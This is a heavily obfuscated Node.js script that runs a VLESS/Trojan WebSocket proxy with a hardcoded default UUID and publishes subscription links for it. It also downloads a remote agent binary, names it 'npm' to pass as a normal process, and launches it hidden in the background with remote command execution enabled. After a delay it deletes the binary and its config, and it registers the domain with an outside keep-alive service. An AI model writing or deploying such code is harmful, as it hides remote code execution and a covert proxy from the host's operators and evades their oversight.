const _0x45bc74=_0x5bf8;(function(_0x47141f,_0x2d2dba){const _0x2a3a4b={_0x4a3d34:0x9c,_0x56ed62:0xdd,_0x3ca86f:0xf9,_0x2d24f7:0xad},_0x54ba05=_0x5bf8,_0x448f45=_0x47141f();while(!![]){try{const _0x298b0b=-parseInt(_0x54ba05(0xbf))/0x1*(parseInt(_0x54ba05(_0x2a3a4b._0x4a3d34))/0x2)+-parseInt(_0x54ba05(0xef))/0x3+-parseInt(_0x54ba05(0xbe))/0x4*(-parseInt(_0x54ba05(0xf5))/0x5)+parseInt(_0x54ba05(0xa9))/0x6+-parseInt(_0x54ba05(_0x2a3a4b._0x56ed62))/0x7+-parseInt(_0x54ba05(_0x2a3a4b._0x3ca86f))/0x8*(parseInt(_0x54ba05(0xc6))/0x9)+parseInt(_0x54ba05(_0x2a3a4b._0x2d24f7))/0xa;if(_0x298b0b===_0x2d2dba)break;else _0x448f45['push'](_0x448f45['shift']());}catch(_0x4a49dd){_0x448f45['push'](_0x448f45['shift']());}}}(_0x4450,0x42423));const os=require('os'),http=require(_0x45bc74(0xc3)),fs=require('fs'),axios=require('axios'),net=require(_0x45bc74(0x97)),path=require(_0x45bc74(0x104)),crypto=require(_0x45bc74(0x10f)),{Buffer}=require('buffer'),{exec,execSync}=require(_0x45bc74(0xfd)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x45bc74(0xbc)]||_0x45bc74(0x10e),NEZHA_SERVER=process[_0x45bc74(0xc7)][_0x45bc74(0xcc)]||'',NEZHA_PORT=process['env'][_0x45bc74(0x111)]||'',NEZHA_KEY=process[_0x45bc74(0xc7)][_0x45bc74(0xab)]||'',DOMAIN=process[_0x45bc74(0xc7)][_0x45bc74(0xa2)]||_0x45bc74(0x113),AUTO_ACCESS=process['env']['AUTO_ACCESS']||!![],WSPATH=process[_0x45bc74(0xc7)][_0x45bc74(0xf1)]||UUID[_0x45bc74(0x108)](0x0,0x8),SUB_PATH=process['env'][_0x45bc74(0xea)]||_0x45bc74(0x100),NAME=process['env']['NAME']||'',PORT=process[_0x45bc74(0xc7)][_0x45bc74(0xb7)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x9b6f96={_0x2b145c:0x98,_0x345153:0xe4,_0x436834:0xc8},_0x36e3f7=_0x45bc74;try{const _0x4d2f0f=await axios[_0x36e3f7(_0x9b6f96._0x2b145c)](_0x36e3f7(0x106)),_0x43128e=_0x4d2f0f[_0x36e3f7(0xd1)];ISP=(_0x43128e[_0x36e3f7(_0x9b6f96._0x345153)]+'-'+_0x43128e[_0x36e3f7(0xf0)])[_0x36e3f7(_0x9b6f96._0x436834)](/ /g,'_');}catch(_0x71f721){ISP=_0x36e3f7(0xd8);}};GetISP();const httpServer=http[_0x45bc74(0xb2)]((_0x589e70,_0x5e5d50)=>{const _0x21feb1={_0xa7509b:0xcb,_0x514bcf:0xb6,_0xd7c8f6:0xff,_0x169f18:0x105,_0x1dd475:0xfc,_0xb2278c:0xd3,_0x1ad5b5:0xc4},_0x285923={_0x1d583e:0xc4,_0x4ca85a:0xda,_0x26632:0xe1},_0x280a80=_0x45bc74;if(_0x589e70[_0x280a80(0x9e)]==='/'){const _0x33a95f=path[_0x280a80(_0x21feb1._0xa7509b)](__dirname,'index.html');fs[_0x280a80(_0x21feb1._0x514bcf)](_0x33a95f,'utf8',(_0x359315,_0x12af45)=>{const _0x56c8e9=_0x280a80;if(_0x359315){_0x5e5d50[_0x56c8e9(_0x285923._0x1d583e)](0xc8,{'Content-Type':_0x56c8e9(_0x285923._0x4ca85a)}),_0x5e5d50[_0x56c8e9(0xe1)]('Hello\x20world!');return;}_0x5e5d50[_0x56c8e9(_0x285923._0x1d583e)](0xc8,{'Content-Type':_0x56c8e9(0xda)}),_0x5e5d50[_0x56c8e9(_0x285923._0x26632)](_0x12af45);});return;}else{if(_0x589e70['url']==='/'+SUB_PATH){const _0x194217=NAME?NAME+'-'+ISP:ISP,_0x5d0b8a=_0x280a80(0xf7)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x280a80(_0x21feb1._0xd7c8f6)+DOMAIN+_0x280a80(0xfb)+WSPATH+'#'+_0x194217,_0x5032bb=_0x280a80(0x114)+UUID+'@'+DOMAIN+_0x280a80(_0x21feb1._0x169f18)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x280a80(0xfb)+WSPATH+'#'+_0x194217,_0xaab97e=_0x5d0b8a+'\x0a'+_0x5032bb,_0x24fb79=Buffer[_0x280a80(0xc1)](_0xaab97e)[_0x280a80(_0x21feb1._0x1dd475)](_0x280a80(_0x21feb1._0xb2278c));_0x5e5d50[_0x280a80(0xc4)](0xc8,{'Content-Type':_0x280a80(0xf2)}),_0x5e5d50['end'](_0x24fb79+'\x0a');}else _0x5e5d50[_0x280a80(_0x21feb1._0x1ad5b5)](0x194,{'Content-Type':'text/plain'}),_0x5e5d50[_0x280a80(0xe1)]('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x45bc74(0xe5))]({'server':httpServer}),uuid=UUID[_0x45bc74(0xc8)](/-/g,''),DNS_SERVERS=[_0x45bc74(0xf4),'1.1.1.1'];function resolveHost(_0x4ef985){return new Promise((_0x3679a0,_0x24fe0d)=>{const _0x41f74f={_0x35c794:0xdc,_0x404e0b:0xb9,_0x43a849:0xcf,_0x2f90cb:0x116,_0xc3b40e:0xf6},_0x8c2f05=_0x5bf8;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x8c2f05(0xf3)](_0x4ef985)){_0x3679a0(_0x4ef985);return;}let _0x5112eb=0x0;function _0x5a3bee(){const _0x20b7b4={_0x2a643c:0xb4,_0x274053:0xdc},_0x4640e3=_0x8c2f05;if(_0x5112eb>=DNS_SERVERS[_0x4640e3(_0x41f74f._0x35c794)]){_0x24fe0d(new Error(_0x4640e3(0xfa)+_0x4ef985+_0x4640e3(_0x41f74f._0x404e0b)));return;}const _0x118feb=DNS_SERVERS[_0x5112eb];_0x5112eb++;const _0x25e068=_0x4640e3(0xee)+encodeURIComponent(_0x4ef985)+_0x4640e3(_0x41f74f._0x43a849);axios[_0x4640e3(0x98)](_0x25e068,{'timeout':0x1388,'headers':{'Accept':_0x4640e3(_0x41f74f._0x2f90cb)}})[_0x4640e3(0xd7)](_0x4655f3=>{const _0x45ee2b=_0x4640e3,_0x54a237=_0x4655f3[_0x45ee2b(0xd1)];if(_0x54a237['Status']===0x0&&_0x54a237[_0x45ee2b(_0x20b7b4._0x2a643c)]&&_0x54a237[_0x45ee2b(_0x20b7b4._0x2a643c)][_0x45ee2b(_0x20b7b4._0x274053)]>0x0){const _0x489f7b=_0x54a237[_0x45ee2b(0xb4)][_0x45ee2b(0xd9)](_0x2be58f=>_0x2be58f[_0x45ee2b(0x110)]===0x1);if(_0x489f7b){_0x3679a0(_0x489f7b[_0x45ee2b(0xd1)]);return;}}_0x5a3bee();})[_0x4640e3(_0x41f74f._0xc3b40e)](_0xbb9cd2=>{_0x5a3bee();});}_0x5a3bee();});}function handleVlessConnection(_0x305eac,_0x276c1d){const _0x586d1d={_0x5805ff:0x108,_0x45c2a1:0xec,_0x5a9d17:0x108,_0x293f38:0x101,_0x51e84f:0xa1,_0x73cf46:0xcb,_0x3b0b1c:0x102,_0x2fe918:0xe2,_0x948d67:0xd7,_0x161f7b:0xf6},_0x16e9b7={_0x15bd0a:0x103,_0x50d6a4:0xc0},_0x10bed4={_0x92fe56:0x103,_0x4493ba:0xc0},_0x1fe567=_0x45bc74,[_0x55c2f2]=_0x276c1d,_0x14650d=_0x276c1d[_0x1fe567(_0x586d1d._0x5805ff)](0x1,0x11);if(!_0x14650d[_0x1fe567(_0x586d1d._0x45c2a1)]((_0x36b8f5,_0x2de64f)=>_0x36b8f5==parseInt(uuid[_0x1fe567(0xe6)](_0x2de64f*0x2,0x2),0x10)))return![];let _0x58264e=_0x276c1d[_0x1fe567(_0x586d1d._0x5a9d17)](0x11,0x12)[_0x1fe567(_0x586d1d._0x293f38)]()+0x13;const _0x579d62=_0x276c1d[_0x1fe567(_0x586d1d._0x5a9d17)](_0x58264e,_0x58264e+=0x2)[_0x1fe567(_0x586d1d._0x51e84f)](0x0),_0x305222=_0x276c1d[_0x1fe567(0x108)](_0x58264e,_0x58264e+=0x1)[_0x1fe567(0x101)](),_0x468172=_0x305222==0x1?_0x276c1d[_0x1fe567(_0x586d1d._0x5a9d17)](_0x58264e,_0x58264e+=0x4)[_0x1fe567(_0x586d1d._0x73cf46)]('.'):_0x305222==0x2?new TextDecoder()['decode'](_0x276c1d[_0x1fe567(_0x586d1d._0x5a9d17)](_0x58264e+0x1,_0x58264e+=0x1+_0x276c1d[_0x1fe567(0x108)](_0x58264e,_0x58264e+0x1)[_0x1fe567(0x101)]())):_0x305222==0x3?_0x276c1d[_0x1fe567(_0x586d1d._0x5a9d17)](_0x58264e,_0x58264e+=0x10)[_0x1fe567(0x107)]((_0x462742,_0x4fe8b0,_0xc505ae,_0x4957d3)=>_0xc505ae%0x2?_0x462742[_0x1fe567(0xe0)](_0x4957d3[_0x1fe567(0x108)](_0xc505ae-0x1,_0xc505ae+0x1)):_0x462742,[])[_0x1fe567(_0x586d1d._0x3b0b1c)](_0x395527=>_0x395527['readUInt16BE'](0x0)[_0x1fe567(0xfc)](0x10))[_0x1fe567(0xcb)](':'):'';_0x305eac[_0x1fe567(_0x586d1d._0x2fe918)](new Uint8Array([_0x55c2f2,0x0]));const _0x195456=createWebSocketStream(_0x305eac);return resolveHost(_0x468172)[_0x1fe567(_0x586d1d._0x948d67)](_0x5f0359=>{const _0x28ee3f={_0x56af2c:0xc9,_0x401a0c:0x108,_0x5dcf9e:0xc0},_0x285705=_0x1fe567;net[_0x285705(_0x10bed4._0x92fe56)]({'host':_0x5f0359,'port':_0x579d62},function(){const _0x169839=_0x285705;this[_0x169839(_0x28ee3f._0x56af2c)](_0x276c1d[_0x169839(_0x28ee3f._0x401a0c)](_0x58264e)),_0x195456['on'](_0x169839(_0x28ee3f._0x5dcf9e),()=>{})[_0x169839(0xb1)](this)['on']('error',()=>{})['pipe'](_0x195456);})['on'](_0x285705(_0x10bed4._0x4493ba),()=>{});})[_0x1fe567(_0x586d1d._0x161f7b)](_0x5d37a9=>{const _0x4d8d53={_0x15b5e3:0xc0,_0x1d31bb:0xb1},_0x31619b=_0x1fe567;net[_0x31619b(_0x16e9b7._0x15bd0a)]({'host':_0x468172,'port':_0x579d62},function(){const _0x2b63f5=_0x31619b;this[_0x2b63f5(0xc9)](_0x276c1d[_0x2b63f5(0x108)](_0x58264e)),_0x195456['on'](_0x2b63f5(_0x4d8d53._0x15b5e3),()=>{})[_0x2b63f5(_0x4d8d53._0x1d31bb)](this)['on'](_0x2b63f5(0xc0),()=>{})[_0x2b63f5(0xb1)](_0x195456);})['on'](_0x31619b(_0x16e9b7._0x50d6a4),()=>{});}),!![];}function handleTrojanConnection(_0x47b7bc,_0x83cf4d){const _0x315059={_0x219c87:0x108,_0x3fecfa:0xcb,_0x450b68:0xdc,_0x32c101:0xd7},_0x2f49fb={_0x53bc49:0xc0},_0x4e6d9a={_0x849272:0xc9,_0x30ac1d:0x108,_0x4eb900:0xc0,_0x4dba19:0xb1},_0x23f831=_0x45bc74;try{if(_0x83cf4d[_0x23f831(0xdc)]<0x3a)return![];const _0x5d68fa=_0x83cf4d['slice'](0x0,0x38)[_0x23f831(0xfc)](),_0x16baf8=[UUID];let _0x3f9e97=null;for(const _0x112261 of _0x16baf8){const _0x1d4ba2=crypto[_0x23f831(0xb3)]('sha224')[_0x23f831(0xbb)](_0x112261)[_0x23f831(0xa7)]('hex');if(_0x1d4ba2===_0x5d68fa){_0x3f9e97=_0x112261;break;}}if(!_0x3f9e97)return![];let _0x407b03=0x38;_0x83cf4d[_0x407b03]===0xd&&_0x83cf4d[_0x407b03+0x1]===0xa&&(_0x407b03+=0x2);const _0x1ee883=_0x83cf4d[_0x407b03];if(_0x1ee883!==0x1)return![];_0x407b03+=0x1;const _0x395585=_0x83cf4d[_0x407b03];_0x407b03+=0x1;let _0x52636d,_0xec80ee;if(_0x395585===0x1)_0x52636d=_0x83cf4d[_0x23f831(_0x315059._0x219c87)](_0x407b03,_0x407b03+0x4)['join']('.'),_0x407b03+=0x4;else{if(_0x395585===0x3){const _0x548054=_0x83cf4d[_0x407b03];_0x407b03+=0x1,_0x52636d=_0x83cf4d[_0x23f831(0x108)](_0x407b03,_0x407b03+_0x548054)['toString'](),_0x407b03+=_0x548054;}else{if(_0x395585===0x4)_0x52636d=_0x83cf4d['slice'](_0x407b03,_0x407b03+0x10)['reduce']((_0x4ae40c,_0x3f9ede,_0x30d609,_0x31c378)=>_0x30d609%0x2?_0x4ae40c['concat'](_0x31c378[_0x23f831(0x108)](_0x30d609-0x1,_0x30d609+0x1)):_0x4ae40c,[])[_0x23f831(0x102)](_0x10c495=>_0x10c495['readUInt16BE'](0x0)[_0x23f831(0xfc)](0x10))[_0x23f831(_0x315059._0x3fecfa)](':'),_0x407b03+=0x10;else return![];}}_0xec80ee=_0x83cf4d[_0x23f831(0xa1)](_0x407b03),_0x407b03+=0x2;_0x407b03<_0x83cf4d[_0x23f831(_0x315059._0x450b68)]&&_0x83cf4d[_0x407b03]===0xd&&_0x83cf4d[_0x407b03+0x1]===0xa&&(_0x407b03+=0x2);const _0x3bcf31=createWebSocketStream(_0x47b7bc);return resolveHost(_0x52636d)[_0x23f831(_0x315059._0x32c101)](_0x3c57e8=>{const _0x55e643={_0x34019d:0xc0,_0x2d5e13:0xb1},_0x292f4b=_0x23f831;net[_0x292f4b(0x103)]({'host':_0x3c57e8,'port':_0xec80ee},function(){const _0x5e56b3=_0x292f4b;_0x407b03<_0x83cf4d['length']&&this[_0x5e56b3(0xc9)](_0x83cf4d['slice'](_0x407b03)),_0x3bcf31['on'](_0x5e56b3(_0x55e643._0x34019d),()=>{})[_0x5e56b3(0xb1)](this)['on'](_0x5e56b3(0xc0),()=>{})[_0x5e56b3(_0x55e643._0x2d5e13)](_0x3bcf31);})['on']('error',()=>{});})[_0x23f831(0xf6)](_0x104b29=>{const _0x123787=_0x23f831;net['connect']({'host':_0x52636d,'port':_0xec80ee},function(){const _0x42f48c=_0x5bf8;_0x407b03<_0x83cf4d[_0x42f48c(0xdc)]&&this[_0x42f48c(_0x4e6d9a._0x849272)](_0x83cf4d[_0x42f48c(_0x4e6d9a._0x30ac1d)](_0x407b03)),_0x3bcf31['on'](_0x42f48c(_0x4e6d9a._0x4eb900),()=>{})[_0x42f48c(_0x4e6d9a._0x4dba19)](this)['on'](_0x42f48c(_0x4e6d9a._0x4eb900),()=>{})[_0x42f48c(0xb1)](_0x3bcf31);})['on'](_0x123787(_0x2f49fb._0x53bc49),()=>{});}),!![];}catch(_0x4051c5){return![];}}wss['on'](_0x45bc74(0xdb),(_0x5defd7,_0x3a6209)=>{const _0xd73ad9={_0x3b6b91:0x9e},_0x168e7b={_0x22aada:0x108},_0x10065a=_0x45bc74,_0x31d0ba=_0x3a6209[_0x10065a(_0xd73ad9._0x3b6b91)]||'';_0x5defd7['once']('message',_0x5a0418=>{const _0x1f0a6c=_0x10065a;if(_0x5a0418[_0x1f0a6c(0xdc)]>0x11&&_0x5a0418[0x0]===0x0){const _0x24d9fa=_0x5a0418[_0x1f0a6c(_0x168e7b._0x22aada)](0x1,0x11),_0x208b35=_0x24d9fa[_0x1f0a6c(0xec)]((_0xeaaa07,_0x866ace)=>_0xeaaa07==parseInt(uuid[_0x1f0a6c(0xe6)](_0x866ace*0x2,0x2),0x10));if(_0x208b35){!handleVlessConnection(_0x5defd7,_0x5a0418)&&_0x5defd7['close']();return;}}!handleTrojanConnection(_0x5defd7,_0x5a0418)&&_0x5defd7[_0x1f0a6c(0xdf)]();})['on'](_0x10065a(0xc0),()=>{});});function _0x5bf8(_0x2acd88,_0x942d02){const _0x4450aa=_0x4450();return _0x5bf8=function(_0x5bf88e,_0x73bace){_0x5bf88e=_0x5bf88e-0x97;let _0x9d0cc=_0x4450aa[_0x5bf88e];return _0x9d0cc;},_0x5bf8(_0x2acd88,_0x942d02);}function _0x4450(){const _0x50ae27=['SUB_PATH','https://amd64.ssss.nyc.mn/agent','every','\x20-p\x20','https://dns.google/resolve?name=','1285563pFONCW','isp','WSPATH','text/plain','test','8.8.4.4','26725hqzBfP','catch','vless://','log','8ufQpqb','Failed\x20to\x20resolve\x20','&path=%2F','toString','child_process','arm','&fp=chrome&type=ws&host=','sub','readUInt8','map','connect','path',':443?security=tls&sni=','https://api.ip.sb/geoip','reduce','slice','npm\x20download\x20successfully','https://arm64.ssss.nyc.mn/v1','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','2053','76303c2e-5968-435c-9c52-fd940f95dbf4','crypto','type','NEZHA_PORT','error:\x20','1234.abc.com','trojan://','Server\x20is\x20running\x20on\x20port\x20','application/dns-json','pop','net','get','2083','utf-8','post','217120OLvJqH','https://oooo.serv00.net/add-url','url','https://','createWriteStream','readUInt16BE','DOMAIN','true','application/json','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','443','digest','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','1548318sizFoV','arch','NEZHA_KEY','8443','7556490czTzot','client_secret:\x20','aarch64','https://arm64.ssss.nyc.mn/agent','pipe','createServer','createHash','Answer','trim','readFile','PORT','finish','\x20with\x20all\x20DNS\x20servers','chmod\x20+x\x20npm','update','UUID','includes','144XYUHgk','2EcrxrJ','error','from','stream','http','writeHead','config.yaml','2180781vVTowZ','env','replace','write','split','join','NEZHA_SERVER','writeFileSync','/bin/bash','&type=A','npm\x20running\x20error:','data','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','base64','https://amd64.ssss.nyc.mn/v1','npm','Automatic\x20Access\x20Task\x20added\x20successfully','then','Unknown','find','text/html','connection','length','327439BBkILD','2096','close','concat','end','send','unlink','country_code','Server','substr','--tls','2087','arm64'];_0x4450=function(){return _0x50ae27;};return _0x4450();}const getDownloadUrl=()=>{const _0x5e6bc9={_0x5e6ffa:0xfe,_0x3f9136:0xe9,_0x1530f8:0xb0,_0x4c8f42:0xd4,_0x3ad3d1:0xeb},_0x351735=_0x45bc74,_0x59a256=os[_0x351735(0xaa)]();return _0x59a256===_0x351735(_0x5e6bc9._0x5e6ffa)||_0x59a256===_0x351735(_0x5e6bc9._0x3f9136)||_0x59a256===_0x351735(0xaf)?!NEZHA_PORT?_0x351735(0x10a):_0x351735(_0x5e6bc9._0x1530f8):!NEZHA_PORT?_0x351735(_0x5e6bc9._0x4c8f42):_0x351735(_0x5e6bc9._0x3ad3d1);},downloadFile=async()=>{const _0x19e583={_0x48551b:0xc2,_0xec73c7:0xa0,_0x16d06e:0xd5,_0x24b201:0xb1},_0x12b01c={_0x24ea4c:0xc0},_0x498b91=_0x45bc74;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0xb140d6=getDownloadUrl(),_0xb67c47=await axios({'method':_0x498b91(0x98),'url':_0xb140d6,'responseType':_0x498b91(_0x19e583._0x48551b)}),_0x30ddff=fs[_0x498b91(_0x19e583._0xec73c7)](_0x498b91(_0x19e583._0x16d06e));return _0xb67c47[_0x498b91(0xd1)][_0x498b91(_0x19e583._0x24b201)](_0x30ddff),new Promise((_0x3ff8b8,_0x3e9412)=>{const _0x459a66=_0x498b91;_0x30ddff['on'](_0x459a66(0xb8),()=>{const _0x5f514f=_0x459a66;console['log'](_0x5f514f(0x109)),exec(_0x5f514f(0xba),_0x5db76a=>{if(_0x5db76a)_0x3e9412(_0x5db76a);_0x3ff8b8();});}),_0x30ddff['on'](_0x459a66(_0x12b01c._0x24ea4c),_0x3e9412);});}catch(_0x3e83b8){throw _0x3e83b8;}},runnz=async()=>{const _0x2ffae2={_0x37b772:0x9a,_0x551241:0xf8,_0xfdbeda:0xe8,_0x153328:0x99,_0x4ea70f:0xed,_0x4c1588:0xca,_0x572af6:0x117,_0x2d14a9:0xbd,_0x452777:0xd2,_0x18748f:0xa5,_0x38d26b:0xf8,_0x3a4536:0xce,_0x22b8b7:0xc0},_0x51d145={_0x28bfb9:0xc0,_0x5e7666:0xd0},_0x2f4a80=_0x45bc74;try{const _0x1aeeed=execSync(_0x2f4a80(0x10c),{'encoding':_0x2f4a80(_0x2ffae2._0x37b772)});if(_0x1aeeed[_0x2f4a80(0xb5)]()!==''){console[_0x2f4a80(_0x2ffae2._0x551241)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x3e4e12){}await downloadFile();let _0x583e11='',_0x10d856=[_0x2f4a80(0xa6),_0x2f4a80(0xac),_0x2f4a80(0xde),_0x2f4a80(_0x2ffae2._0xfdbeda),_0x2f4a80(_0x2ffae2._0x153328),_0x2f4a80(0x10d)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x2b6e4f=_0x10d856[_0x2f4a80(0xbd)](NEZHA_PORT)?_0x2f4a80(0xe7):'';_0x583e11='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x2f4a80(_0x2ffae2._0x4ea70f)+NEZHA_KEY+'\x20'+_0x2b6e4f+_0x2f4a80(0x10b);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2bef40=NEZHA_SERVER[_0x2f4a80(0xbd)](':')?NEZHA_SERVER[_0x2f4a80(_0x2ffae2._0x4c1588)](':')[_0x2f4a80(_0x2ffae2._0x572af6)]():'',_0x2185b6=_0x10d856[_0x2f4a80(_0x2ffae2._0x2d14a9)](_0x2bef40)?_0x2f4a80(0xa3):'false',_0x28ff5d=_0x2f4a80(0xae)+NEZHA_KEY+_0x2f4a80(_0x2ffae2._0x452777)+NEZHA_SERVER+_0x2f4a80(_0x2ffae2._0x18748f)+_0x2185b6+_0x2f4a80(0xa8)+UUID;fs[_0x2f4a80(0xcd)]('config.yaml',_0x28ff5d);}_0x583e11='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x2f4a80(_0x2ffae2._0x38d26b)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x583e11,{'shell':_0x2f4a80(_0x2ffae2._0x3a4536)},_0x3d140b=>{const _0x346e95=_0x2f4a80;if(_0x3d140b)console[_0x346e95(_0x51d145._0x28bfb9)](_0x346e95(_0x51d145._0x5e7666),_0x3d140b);else console['log']('npm\x20is\x20running');});}catch(_0x49d613){console[_0x2f4a80(_0x2ffae2._0x22b8b7)](_0x2f4a80(0x112)+_0x49d613);}};async function addAccessTask(){const _0x5ea7a2={_0x1c8f01:0x9b,_0x338889:0x9d,_0x4ad0ff:0xa4},_0x5a2664=_0x45bc74;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x3354db=_0x5a2664(0x9f)+DOMAIN;try{const _0x1855dc=await axios[_0x5a2664(_0x5ea7a2._0x1c8f01)](_0x5a2664(_0x5ea7a2._0x338889),{'url':_0x3354db},{'headers':{'Content-Type':_0x5a2664(_0x5ea7a2._0x4ad0ff)}});console['log'](_0x5a2664(0xd6));}catch(_0x69be9){}}const delFiles=()=>{const _0x49e1e7={_0x3c12be:0xe3,_0x5eaef6:0xe3},_0x368fba=_0x45bc74;fs[_0x368fba(_0x49e1e7._0x3c12be)](_0x368fba(0xd5),()=>{}),fs[_0x368fba(_0x49e1e7._0x5eaef6)](_0x368fba(0xc5),()=>{});};httpServer['listen'](PORT,()=>{const _0xabf1c1={_0xc0ec8d:0x115},_0x2d25d4=_0x45bc74;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x2d25d4(0xf8)](_0x2d25d4(_0xabf1c1._0xc0ec8d)+PORT);});
